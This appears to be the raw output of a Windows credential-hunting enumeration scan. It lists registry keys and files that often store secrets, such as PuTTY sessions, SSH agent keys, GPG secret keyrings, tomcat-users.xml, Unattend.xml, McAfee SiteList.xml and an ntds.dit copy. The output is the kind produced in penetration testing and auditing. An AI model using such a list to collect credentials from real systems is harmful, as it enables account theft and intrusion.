+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
+Looking inside HKCU\Software\OpenSSH\Agent\Keys
+C:\Bitnami\jenkins-2.121.1-0\apache-tomcat\conf\tomcat-users.xml
+C:\Bitnami\jenkins-2.121.1-0\apache-tomcat\conf\server.xml
+C:\Bitnami\jenkins-2.121.1-0\apache2\conf\httpd.conf
+C:\Bitnami\jenkins-2.121.1-0\apache2\conf\server.csr
+C:\Bitnami\jenkins-2.121.1-0\apache2\conf\httpd.conf
+C:\Bitnami\jenkins-2.121.1-0\apache2\conf\original\httpd.conf
+C:\Bitnami\jenkins-2.121.1-0\apache2\conf\original\httpd.conf
+C:\Bitnami\jenkins-2.121.1-0\apache2\logs\access.log
+C:\Bitnami\jenkins-2.121.1-0\apache2\logs\error.log
+C:\Bitnami\jenkins-2.121.1-0\apache2\logs\access.log
+C:\Bitnami\jenkins-2.121.1-0\apache2\logs\error.log
+C:\Bitnami\jenkins-2.121.1-0\git\etc\bash.bashrc
+C:\Bitnami\jenkins-2.121.1-0\gradle\samples\signing\gnupg-signatory\gnupg-home\pubring.gpg
+C:\Bitnami\jenkins-2.121.1-0\gradle\samples\signing\gnupg-signatory\gnupg-home\secring.gpg
+C:\Bitnami\jenkins-2.121.1-0\gradle\samples\signing\gnupg-signatory\gnupg-home\trustdb.gpg
+C:\Bitnami\jenkins-2.121.1-0\gradle\samples\signing\maven\secKeyRingFile.gpg
+C:\Bitnami\jenkins-2.121.1-0\gradle\samples\signing\maven-publish\secKeyRingFile.gpg
+C:\Bitnami\jenkins-2.121.1-0\gradle\samples\signing\tasks\secKeyRingFile.gpg
+C:\Bitnami\jenkins-2.121.1-0\java\lib\security\blacklisted.certs
+C:\ProgramData\McAfee\Common Framework\SiteList.xml
+C:\Users\All Users\McAfee\Common Framework\SiteList.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\setupinfo
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
+
+---
+Scan complete.
